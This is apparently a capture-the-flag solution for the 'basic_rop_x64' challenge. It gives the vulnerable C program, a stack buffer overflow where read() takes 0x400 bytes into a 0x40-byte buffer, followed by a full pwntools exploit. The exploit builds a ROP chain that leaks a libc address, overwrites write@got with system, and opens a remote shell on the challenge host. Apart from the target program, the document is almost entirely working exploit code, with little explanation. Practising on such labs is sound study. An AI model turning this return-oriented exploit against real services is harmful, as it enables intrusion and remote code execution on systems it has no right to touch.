## basic_rop_x64
---

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

<br><br>

## Solution
---

```
[*] '/home/index/rop64/basic_rop_x64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

<br>

```python
from pwn import *

p = remote('host3.dreamhack.games',13809)

e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
pop_rdi_ret = 0x0000000000400883
pop_rsi_r15_ret = 0x0000000000400881
binsh = write_got + 0x8

# payload
# buf padding + sfp + ret + write(1,read@got,len) + read(0,write@got,len) + write(/bin/sh)

payload = b"A"*0x40 + b"B"*0x8

# write(1,read@got,len)
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(pop_rsi_r15_ret)
payload += p64(read_got)
payload += p64(0)
payload += p64(write_plt)

# read(0,write@got,len)
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_r15_ret)
payload += p64(write_got)
payload += p64(0)
payload += p64(read_plt)

# write(/bin/sh)
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(write_plt)

p.sendline(payload)
p.recv()

read_addr = u64(p.recvn(6)+b"\x00"*2)
libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']

print("@ read : ", hex(read_addr))
print("@ libc : ", hex(libc_base))
print("@ system :", hex(system_addr))

sleep(5)
p.send(p64(system_addr)+b"/bin/sh\x00")

p.interactive()
```
